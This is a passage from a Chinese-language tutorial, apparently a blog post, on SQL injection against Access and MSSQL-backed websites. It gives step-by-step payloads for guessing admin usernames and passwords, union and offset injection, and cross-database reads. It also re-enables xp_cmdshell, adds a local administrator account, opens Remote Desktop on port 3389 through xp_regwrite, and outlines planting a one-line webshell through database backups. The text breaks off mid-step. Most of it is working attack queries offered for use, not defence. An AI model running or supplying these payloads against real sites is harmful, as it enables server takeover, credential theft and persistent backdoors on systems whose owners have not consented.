class="hljs-built_in">from</span> administrator)&gt;xx<br><br><span class="hljs-comment">#如以下报错，可确定字段数目为5</span><br><span class="hljs-keyword">http</span>://xxx?id=<span class="hljs-number">14</span> <span class="hljs-keyword">and</span> (select top <span class="hljs-number">1</span> <span class="hljs-built_in">len</span>(user_name) <span class="hljs-built_in">from</span> administrator)&gt;<span class="hljs-number">3</span>    ●正常<br><span class="hljs-keyword">http</span>://xxx?id=<span class="hljs-number">14</span> <span class="hljs-keyword">and</span> (select top <span class="hljs-number">1</span> <span class="hljs-built_in">len</span>(user_name) <span class="hljs-built_in">from</span> administrator)&gt;<span class="hljs-number">4</span>   ●正常<br><span class="hljs-keyword">http</span>://xxx?id=<span class="hljs-number">14</span> <span class="hljs-keyword">and</span> (select top <span class="hljs-number">1</span> <span class="hljs-built_in">len</span>(user_name) <span class="hljs-built_in">from</span> administrator)&gt;<span class="hljs-number">5</span>  ●报错<br></code></pre></td></tr></table></figure><p><strong>猜解字段内容</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> (select top <span class="hljs-number">1</span> asc(mid(user_name,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) from administrator)&gt;xx<br><br><span class="hljs-comment">#先判断第一个字母，是汉字还是字母</span><br><span class="hljs-comment">## 返回正常页面说明ASCII值大于0 ,是字母</span><br><span class="hljs-attribute">http</span>://xxx?id=<span class="hljs-number">14</span> and (select top <span class="hljs-number">1</span> asc(mid(user_name,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) from administrator)&gt;<span class="hljs-number">0</span><br><br><span class="hljs-comment"># 二分法确定acsii码,</span><br><span class="hljs-attribute">http</span>://xxx?id=<span class="hljs-number">14</span> and (select top <span class="hljs-number">1</span> asc(mid(user_name,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) from administrator)&gt;<span class="hljs-number">100</span><br><span class="hljs-attribute">http</span>://xxx?id=<span class="hljs-number">14</span> and (select top <span class="hljs-number">1</span> asc(mid(user_name,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) from administrator)&gt;<span class="hljs-number">50</span><br><span class="hljs-attribute">http</span>://xxx?id=<span class="hljs-number">14</span> and (select top <span class="hljs-number">1</span> asc(mid(user_name,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) from administrator)&gt;<span class="hljs-number">75</span><br><br><span class="hljs-comment"># 最后根据确定下来的acsii码97，反查对应表得到第一个字母为a，在用同样的方法确定出来其他位字母</span><br><span class="hljs-comment">## 密码的话一般会做md5加密，记得用网站的解密工具尝试（简单的可以反解成功）</span><br></code></pre></td></tr></table></figure><blockquote><p>小提示: access数据库都是存放在网站目录下，后缀格式为mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库，如果是MSSQL、MYSQL等，一般数据库是存储在数据库安装路径下，后缀格式为myi，myd，frm，mdf 不能通过下载得到库。除非走狗屎运，对方管理员把网站库备份在网站目录下。</p></blockquote><h4 id="用联合查询方案注入（通用）"><a href="#用联合查询方案注入（通用）" class="headerlink" title="用联合查询方案注入（通用）"></a>用联合查询方案注入（通用）</h4><p>首先还是要先猜解出所需的表的表名和字段名，这个没有办法 再用order by语句排序，根据排序数量，可知当前页面可查询字段数，假设为7 再通过union查询数字，确定出页面可显示的字段(假设是第2和3字段) 最后通过union语句联合查询指定表(在可显示的字段替换为需要查询的表中的字段)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">order</span> by <span class="hljs-number">7</span><br><span class="hljs-attribute">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span> from admin<br><span class="hljs-attribute">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,user_name,passwoed,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span> from admin<br></code></pre></td></tr></table></figure><h3 id="偏移注入和跨库查询"><a href="#偏移注入和跨库查询" class="headerlink" title="偏移注入和跨库查询"></a>偏移注入和跨库查询</h3><h4 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h4><p>偏移注入会随机爆出一个字段内容，具体是什么看运气 偏移注入只针对Access数据库，当我们只猜到数据库表名但猜不到列名的情况下，这种方法可以帮我们填补。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">#第一步:使用之前的方法得到显示点为<span class="hljs-number">2</span>,<span class="hljs-number">3</span>，字段个数为<span class="hljs-number">7</span>，但是我们并不知道列名<br>http://XXX?id=<span class="hljs-number">14</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span> <span class="hljs-keyword">from</span> administrator<br><br>#第二步:用*依次向前替换数字字段，直到页面显示正常。例如在<span class="hljs-number">5</span>替换为*后页面返回正常<br>http://XXX?id=<span class="hljs-number">14</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,* <span class="hljs-keyword">from</span> administrator<br>#说明星号替换了<span class="hljs-number">3</span>个字段(也就是表中有三个字段),后续要使用<span class="hljs-keyword">inner</span> jion自表连接查询，因此计算字段数乘以<span class="hljs-number">2</span>是否小于当前列(<span class="hljs-number">3</span>*<span class="hljs-number">2</span>&lt;<span class="hljs-number">7</span>)<br><br>#第三步:公式成立的话，用<span class="hljs-keyword">inner</span> jion自连接查询<br>http://XXX?id=<span class="hljs-number">14</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,*  <span class="hljs-keyword">from</span> (administrator <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> administrator <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id)<br><br>#如果是更多位，可再接<span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span><br>http://XXX?id=<span class="hljs-number">14</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,* <span class="hljs-keyword">from</span> ((administrator <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> administrator <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> administrator <span class="hljs-keyword">as</span> c a.id=c.id)<br></code></pre></td></tr></table></figure><h4 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h4><p>假设a和b两个站点在同一服务器上面，但a服务器上面安装了安全狗、Waf这样的安全软件，现在我们要对a站点进行攻击，但是没发现什么大漏洞，只找到网站数据库路径，对数据库下载发现下载不了。 这个时候我发现b站点有注入点。并且知道了“2和3”是注入点，可以通过跨库的方式，读取指定目录下access数据库的数据。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://xxx?id=<span class="hljs-number">14</span> union select <span class="hljs-number">1</span>,adminpassword,username,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span> from[C:\wwwtest\<span class="hljs-number">2</span>AspCMS\AspCms_data\data.asp].Aspcms_Admins<br></code></pre></td></tr></table></figure><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p>在<code>MSSQL</code>中每个库都有一个系统自带表–&gt;<code>sysobjects</code></p><p>​        此系统表中对我们有用的只有3个字段，<code>NAME</code>字段和<code>XTYPE</code>字段和<code>ID</code>字段，<code>name就是表名信息</code>，<code>xtype是代表表的类型</code>，只有两个参数，<code>S</code>代表系统自带表，<code>U</code>代表用户创建的表，<code>id</code>字段的值用来<code>连接syscolumns</code>表</p><p><code>mssql</code>有三个权限，<code>sa</code>（最高权限，相当于system），<code>db</code>（文件管理，数据库操作等等，相当于user-administrator），<code>public</code>（数据库操作权限，相当于guest-users）</p><h3 id="第一步：注入点类型的判断"><a href="#第一步：注入点类型的判断" class="headerlink" title="第一步：注入点类型的判断"></a>第一步：注入点类型的判断</h3><p>首先要对MsSQL注入点进行一下基本的注入检测，然后判断是否是MsSQL注入点</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 如果页面返回正常，则说明为MsSQL注入点。<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> sysobjects) <span class="hljs-operator">&gt;</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="第二步：获取当前系统用户名"><a href="#第二步：获取当前系统用户名" class="headerlink" title="第二步：获取当前系统用户名"></a>第二步：获取当前系统用户名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-built_in">system_user</span><span class="hljs-operator">=</span><span class="hljs-number">0</span><br># <span class="hljs-built_in">system_user</span>是查询当前数据库系统的用户名，是字符型,与整型数据进行对比时,类型不匹配会造成数据库报错。<br># 从返回的错误信息中，可得知当前系统用户名。（如果不行，换个浏览器试试可能就成功了）<br></code></pre></td></tr></table></figure><h3 id="第三步：判断注入点权限"><a href="#第三步：判断注入点权限" class="headerlink" title="第三步：判断注入点权限"></a>第三步：判断注入点权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;sysadmin&#x27;</span>))<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;db_owner&#x27;</span>))<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;public&#x27;</span>))<br><br>如果查询返回正常页面，则说明当前数据库用户具有sa、db_owner、public权限，<br>sa为数据库用户中最高权限，默认也是系统权限，对服务器安全威胁是相当高的。<br>如果数据库与Web服务器是同一个，默认情况下可以通过MsSQL自带的存储过程对整个服务器进行控制。<br>db_owner 权限的话，我们可以找到WEB的路径，然后用备份的方式得到webshell，有时也可以对注册表进行操作。<br>public 权限的话，又要面对表和列了，不过MSSQL比ACCESS的“猜”表方便许多，这里是“暴”表，使目标直接暴出来。<br>如果权限不足，可通过注入点猜解数据库内容获得管理员账号。<br></code></pre></td></tr></table></figure><h3 id="第四步：MsSQL返回信息判断"><a href="#第四步：MsSQL返回信息判断" class="headerlink" title="第四步：MsSQL返回信息判断"></a>第四步：MsSQL返回信息判断</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> @<span class="hljs-variable">@version</span><span class="hljs-operator">&gt;</span><span class="hljs-number">0</span><br># 从页面返回的错误信息中，可以得到数据库版本信息。<br># 如果页面出错，但未返回可利用的信息，则说明MsSQL关闭了错误信息提示，<br># 在猜解数据库内容时，就不能用爆库的方法了，只能使用<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>联合查询或盲注入攻击方法。<br><br># 如下查询检测，获得更多的关于MsSQL注入点的信息。<br>## 判断MsSQL支持多行语句查询<br>;<span class="hljs-keyword">declare</span> <span class="hljs-variable">@d</span> <span class="hljs-type">int</span> <br># 是否支持子查询<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span> (<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> [sysobjects])<span class="hljs-operator">&gt;=</span><span class="hljs-number">0</span><br># 获取当前数据库用户名<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">user</span><span class="hljs-operator">&gt;</span>O<br># 获取当前数据库名称<br><span class="hljs-keyword">and</span> db_name<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span><br># 当前数据库名<br><span class="hljs-keyword">and</span> l<span class="hljs-operator">=</span><span class="hljs-keyword">convert</span> (<span class="hljs-type">int</span>,db_name ()) 或 <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> db_name ())<br># 本地服务名<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@servername</span>)<br># 判断是否有库读取权限<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">Select</span> HAS_DBACCESS (<span class="hljs-string">&#x27;master&#x27;</span>))<br><br>#mssql中用联合查询时判断显示位时必须要用<span class="hljs-keyword">null</span>来代替<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span> 并且可以用加<span class="hljs-string">&#x27;号的形式来确定输出位置</span><br><span class="hljs-string">and 1=2 union all select null,null</span><br><span class="hljs-string">#查询表</span><br><span class="hljs-string">and 1=2 union all select null,(select top 1 name from schemaname.dbo.sysobjects where xtype =&#x27;</span>u<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">其中xtype查询的是数据库中表是由谁创建的有 u 和 s 两个属性</span><br><span class="hljs-string">sysobjects和mysql中的information_schema表相似</span><br><span class="hljs-string">#查列</span><br><span class="hljs-string">and 1=2 union all select null,(select top 1 col_name(object_id(&#x27;</span>tablename<span class="hljs-string">&#x27;),1) from sysobjects)</span><br><span class="hljs-string">#查数据</span><br><span class="hljs-string">and 1=2 union all select null,(select top1 colnmae from tablename)</span><br></code></pre></td></tr></table></figure><h3 id="第五步：利用MsSQL扩展存储注入攻击"><a href="#第五步：利用MsSQL扩展存储注入攻击" class="headerlink" title="第五步：利用MsSQL扩展存储注入攻击"></a>第五步：利用MsSQL扩展存储注入攻击</h3><p>扩展存储过程是MsSQL提供的特殊功能。 所谓“扩展存储过程”，其实就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能. MsSQL利用扩展存储可以实现许多强大的功能，包括对系统进行操作.利用这个特性，在实施MsSQL注入攻击时，可以更容易地对系统进行控制。</p><p>xp_cmdshell是什么？ 答：SQL中运行系统命令行的系统存储过程，一般在安全级别较高的服务器上，建议关闭或限制访问权限。</p><p>可以使用外围应用配置器工具以及通过执行 sp_configure 来启用和禁用 xp_cmdshell。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 提交如下查询进行检测。查看xp_cmdshell、xp_regread扩展存储过程是否被删除。<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">Select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> master. dbo.sysobjects  <span class="hljs-keyword">Where</span> xtype <span class="hljs-operator">=</span><span class="hljs-string">&#x27;X&#x27;</span> <span class="hljs-keyword">AND</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>)<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">Select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> master. dbo.sysobjects  <span class="hljs-keyword">Where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;xp_regread&#x27;</span>)<br><br>#如果扩展存储被删除，可执行如下查询进行恢复。<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-comment">--</span><br><br>## 或者以下一系列语句：<br>;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE <span class="hljs-comment">--</span><br>;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE <span class="hljs-comment">--</span><br>;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">0</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h4 id="攻击中最常利用的扩展存储"><a href="#攻击中最常利用的扩展存储" class="headerlink" title="攻击中最常利用的扩展存储"></a>攻击中最常利用的扩展存储</h4><p>xp_cmdshell—利用此存储过程可以直接执行系统命令。 xp_regread—利用此存储过程可以进行注册表读取。 xp_regwrit一利用此存储过程可以写入注册表。 xp_dirtre一利用此存储过程可以进行列目录操作。 xp_enumds—利用此存储过程可以进行ODBC连接。 xp_loginconfig-利用此存储过程可以配置服务器安全模式信息。 xp_makecab一一利用此存储过程可以创建压缩卷。 xp_ntsec_enumdomains-利用此存储过程可以查看domain信息。 xp_terminate_jroces一利用此存储过程可以查看终端进程，给出一个进程PID. 结合上面的这些扩展存储，通过提交精心构造的查询语句，可利用扩展存储的强大功能进行攻击。</p><h3 id="第六步：SA权限下扩展存储攻击利用方法→3389远程终端"><a href="#第六步：SA权限下扩展存储攻击利用方法→3389远程终端" class="headerlink" title="第六步：SA权限下扩展存储攻击利用方法→3389远程终端"></a>第六步：SA权限下扩展存储攻击利用方法→3389远程终端</h3><p>SA权限判断</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>))<br></code></pre></td></tr></table></figure><p>利用扩展存储开启远程终端步骤：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-number">1.</span>添加账号：<br>;<span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;net user test test /add&#x27;</span><br># <span class="hljs-number">2.</span>提权账号：加入admin组<br>;<span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;net localgroup administrators test /add&#x27;</span><br># <span class="hljs-number">3.</span>开启<span class="hljs-number">3389</span>端口：不报错就表示成功<br>;execmaster.dbo.xp_regwrite<span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,<span class="hljs-string">&#x27;fDenyTSConnections&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br># <span class="hljs-number">4.</span>链接<span class="hljs-number">3389</span>端口控制对方的电脑<br>输入目标的IP，账号密码就是test，连接成功后退出的话点击断开，不要关机。<br></code></pre></td></tr></table></figure><p>⛔sa权限下，还有如下几种方法都可以获得目标的webshell。</p><ul><li>利用 xp_regwrite 操作注册表与开启沙盒模式</li><li>利用 sp_makewebtask 写入一句话木马</li><li>利用 sp_oacreate 存储远程下载文件</li><li>利用 sp_addlogin 扩展管理数据库用户</li><li>利用 xp_servicecontrol 管理服务</li></ul><h3 id="第七步：dbowner-权限利用方法（-）"><a href="#第七步：dbowner-权限利用方法（-）" class="headerlink" title="第七步：dbowner 权限利用方法（ ）"></a>第七步：dbowner 权限利用方法（ ）</h3><p>dbowner权限判断</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">SELECT</span> IS_MEMBER(<span class="hljs-symbol">&#x27;db_owner</span>&#x27;));<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>⛔当数据库连接账户为dbowner权限时，无法直接利用扩展存储执行各种系统命令，进行攻击的过程比较烦琐。</p><ol><li>通常首先利用xp_dirtree扩展存储列出Web目录，</li><li>然后利用SQL语句创建一个临时表，插入一句话木马到临时表中。</li><li>然后利用数据库备份语句，将数据库备份到Web目录并保存为ASP格式的文件，即可得到一个一句话木马后门。</li><li>最后利用一句话木马客户端连接后门，得到WebShell后就可以控制整个服务器了。</li></ol><p>🔰db_owner目前公开的方法主要有五种： 第一种：就是最普遍的backup，现在利用差异备份生成的asp文件确实要比以前小拉不少，但能否得到webshell，目前成功率还不是很高。 第二种：就是在下的万能提权，此法成功率几乎为零，只有在特定的条件下面才能实现。 第三种：就是LCX大牛在《MSSQLdb_owner角色注入直接获得系统权限》所说的利用xp_regread读出VNC在注册表的加密密码，然后破解，直接拿到系统权限，这种方法局限性比较大，要是对方主机没有装vnc，你怎么办。 第四种：就是利用xp_regwrite再注册表里直接加个系统帐号或者直接写个webshell，在主机重起的时候就可以拿到webshell或者系统权限。此法适用范围比较大，成功率也相对前3种较高点，但缺点也是显而易见的，就是不能够马上得到webshell，需要对方重起。 第五种：就是利用添加作业的一些存储过程，sp_add_job，sp_addtask，xp_dirtree之类得到系统权限。理论上应该说是目前这5种里面成功率最高的的一种，</p><p>下面我们就重点介绍一下第五种方法。</p><h4 id="1-找出网站安装路径："><a href="#1-找出网站安装路径：" class="headerlink" title="1.找出网站安装路径："></a>1.找出网站安装路径：</h4><p>当Web服务器与数据库在同一服务器主机上时，就可以备份一句话木马到Web目录了。但是在备份一句话木马前，首先需要搜索Web目录，可通过如下几个步骤实现。 第壹种方法：通过报错或baidu、google等查找 第贰种方法：这种方法需要满足三个条件，可以获取目标的所有盘符和深度</p><ol><li>SQL SERVER允许执行多行语句；</li><li>该网站能进行注入；</li><li>没有返回详细的错误提示信息(否则没有必要用这种方法)。</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-number">1.</span> 删除表black；首先建立一个临时表用于存放master..xp_dirtree(适合于public)生成的目录树 ，该表的dir字段表示目录的名称，depth字段表示目录的深度。<br>;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> black;<span class="hljs-keyword">create table</span> temp(dir nvarchar (<span class="hljs-number">255</span>), depth <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),files <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>), id <span class="hljs-type">int</span> <span class="hljs-keyword">not null</span> <span class="hljs-keyword">identity</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-comment">--</span><br># <span class="hljs-number">2.</span> 然后执行xp_dirtree获得D盘的目录树<br>;<span class="hljs-keyword">insert into</span> temp(dir,depth,files) <span class="hljs-keyword">exec</span> master.dbo.xp_dirtree <span class="hljs-string">&#x27;D:&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-comment">--</span><br># <span class="hljs-number">3.</span> 查看D盘有几个文件夹，这样对D盘有个大致的了解<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span> depth<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> dir <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;Documents and Settings&#x27;</span>,<span class="hljs-string">&#x27;Program Files&#x27;</span>,<span class="hljs-string">&#x27;RECYCLER&#x27;</span>,<span class="hljs-string">&#x27;System Volume Information&#x27;</span>,<span class="hljs-string">&#x27;WINDOWS&#x27;</span>,<span class="hljs-string">&#x27;CAConfig&#x27;</span>,<span class="hljs-string">&#x27;wmpub&#x27;</span>,<span class="hljs-string">&#x27;Microsoft UAM 卷&#x27;</span>))<span class="hljs-operator">&gt;=</span>数字(数字<span class="hljs-operator">=</span><span class="hljs-number">0</span>、<span class="hljs-number">1</span>、<span class="hljs-number">2</span>、<span class="hljs-number">3.</span>..)<br># <span class="hljs-number">4.</span> 接着在对方的网站上找几个一级子目录，如<span class="hljs-keyword">user</span>、photo，然后，用筛选的方法来判断WEB根目录上是否存在此盘上<br>## 看语句的返回结果，如果为真，表示WEB根目录有可能在此盘上<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span>  dir<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;user&#x27;</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp)<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span> dir<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;photo&#x27;</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp)<br># <span class="hljs-number">5.</span> 假设找到的WEB根目录在此盘上，用下面的语句来获得一级子目录的深度：<br>## 假设得到的depth是<span class="hljs-number">3</span>,说明<span class="hljs-keyword">user</span>目录是D盘的<span class="hljs-number">3</span>级目录，则WEB根目录是D盘的二级目录。<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> depth <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span> dir<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span>)<span class="hljs-operator">&gt;=</span>数字  #数字<span class="hljs-operator">=</span><span class="hljs-number">1</span>、<span class="hljs-number">2</span>、<span class="hljs-number">3.</span>..<br># <span class="hljs-number">6.</span> 